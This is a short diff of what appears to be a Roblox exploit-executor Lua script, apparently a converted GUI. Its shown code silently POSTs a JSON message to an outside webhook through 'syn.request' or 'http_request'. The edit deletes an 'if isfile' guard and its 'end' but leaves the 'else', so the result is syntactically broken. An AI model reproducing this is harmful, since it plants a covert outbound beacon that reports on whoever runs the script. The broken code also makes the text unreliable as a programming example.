@@ -94,12 +94,10 @@ local msg = {
    }
 }
 
-if isfile("Workspace/readthis.txt") then
 print("nil")
     else
     request = http_request or request or HttpPost or syn.request
     request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
-end
 log = false
 
 -- Instances: 275 | Scripts: 9 | Modules: 0
